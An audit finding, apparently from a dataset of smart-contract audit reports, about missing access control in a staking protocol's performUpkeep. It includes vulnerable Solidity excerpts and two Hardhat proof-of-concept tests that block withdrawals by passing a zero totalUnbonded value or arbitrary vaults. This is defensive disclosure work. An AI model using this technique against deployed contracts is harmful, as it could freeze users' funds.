# [H] Lack of access control in `FundController::performUpkeep` can allow an attacker to block withdrawals

## Summary
Severity: High
Contest weight: 0.8868
Dataset id: 21929
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
** Anyone can perform upkeep on the `FundFlowController`. This will rotate the unbonded vault groups in the vault controllers through `VaultControllerStrategy::updateVaultGroups`.

The user calling `FundFlowController::performUpkeep` also provides the details to `VaultControllerStrategy::updateVaultGroups`, the vaults to unbond in the Chainlink staking pool and the new `totalUnbonded` amount:
```solidity
function updateVaultGroups(
    uint256[] calldata _curGroupVaultsToUnbond,
    uint256 _nextGroup,
    uint256 _nextGroupTotalUnbonded
) external onlyFundFlowController {
    for (uint256 i = 0; i < _curGroupVaultsToUnbond.length; ++i) {
        vaults[_curGroupVaultsToUnbond[i]].unbond();
    }

    globalVaultState.curUnbondedVaultGroup = uint64(_nextGroup);
    totalUnbonded = _nextGroupTotalUnbonded;
}
```
None of these two parameters are validated. Hence a user could provide any vaults to unbond or any new `totalUnbonded` amount.

** Providing `0` as `_nextGroupTotalUnbonded` would effectively block withdrawals because of this check in `VaultControllerStrategy::withdraw`:
```solidity
function withdraw(uint256 _amount, bytes calldata _data) external onlyStakingPool {
    if (!fundFlowController.claimPeriodActive() || _amount > totalUnbonded)
        revert InsufficientTokensUnbonded();
```

Since `FundFlowController::performUpkeep` can only be called at certain times (when new vaults are available to be unbonded) this could block withdrawals until it could be called the next time. At which time the attacker could call this again to continue to block withdrawals.

Setting `totalUnbonded` to `0`, although less impactful, would also break depositing into vaults with active unbonding in `_depositToVaults`:
```solidity
if (vault.unbondingActive()) {
    totalRebonded += deposits;
}
...

if (totalRebonded != 0) totalUnbonded -= totalRebonded;
```

Providing erroneous vaults could be used to reorder which vaults are available to withdraw from causing disruptions in withdrawals. Since `FundFlowController` and `VaultControllerStrategy` assumes that all vaults with deposits in the group are available when the group is active.

## Proof of Concept
** Two tests, one for `totalUnbonded` and one for the unbonded vaults, that can be added to `vault-controller-strategy.test.ts`:
```javascript
it('performUpkeep, updateVaultGroups can be called by anyone and lacks validation for totalUnbonded', async () => {
    const { adrs, strategy, token, stakingController, vaults, updateVaultGroups } =
      await loadFixture(deployFixture)

    // Deposit into vaults
    await strategy.deposit(toEther(500), encodeVaults([]))
    assert.equal(fromEther(await token.balanceOf(adrs.stakingController)), 500)
    for (let i = 0; i < 5; i++) {
      assert.equal(fromEther(await stakingController.getStakerPrincipal(vaults[i])), 100)
    }
    assert.equal(Number((await strategy.globalVaultState())[3]), 5)

    // do the initial rotation to get a vault into claim period
    await updateVaultGroups([0, 5, 10], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([1, 6, 11], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([2, 7], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([3, 8], 0)
    await time.increase(claimPeriod)

    // user calls `fundFlowController.performUpkeep` with erroneous `totalUnbonded`
    await updateVaultGroups([4, 9], 0)

    // causing withdrawals to stop working
    await expect(
      strategy.withdraw(toEther(50), encodeVaults([0, 5]))
    ).to.be.revertedWithCustomError(strategy, 'InsufficientTokensUnbonded()')
})

it('performUpkeep, updateVaultGroups can be called by anyone and lacks validation for unbonded vaults', async () => {
    const { adrs, strategy, token, stakingController, vaults, updateVaultGroups } =
      await loadFixture(deployFixture)

    // Deposit into vaults
    await strategy.deposit(toEther(500), encodeVaults([]))
    assert.equal(fromEther(await token.balanceOf(adrs.stakingController)), 500)
    for (let i = 0; i < 5; i++) {
      assert.equal(fromEther(await stakingController.getStakerPrincipal(vaults[i])), 100)
    }
    assert.equal(Number((await strategy.globalVaultState())[3]), 5)

    // calling `fundFlowController.performUpkeep` with vaults in other groups
    await updateVaultGroups([0, 1, 2, 3, 4], 0)
    await time.increase(claimPeriod)
    await expect(
      updateVaultGroups([1, 6, 11], 0)
    ).to.be.revertedWithCustomError(stakingController, 'UnbondingPeriodActive()')
})
```

## Recommendation
** Consider not allowing the user to provide any vaults or amounts at all. `FundFlowController` has a `view` function `checkUpkeep` which collects all this data.

We recommend combining `checkUpkeep` and `performUpkeep` to be linked so that the caller won't provide any data. This would also address issue 7.3.6 [*Potential stale data in `FundFlowController::performUpkeep` can lead to incorrect state updates*](#potential-stale-data-in-fundflowcontrollerperformupkeep-can-lead-to-incorrect-state-updates)
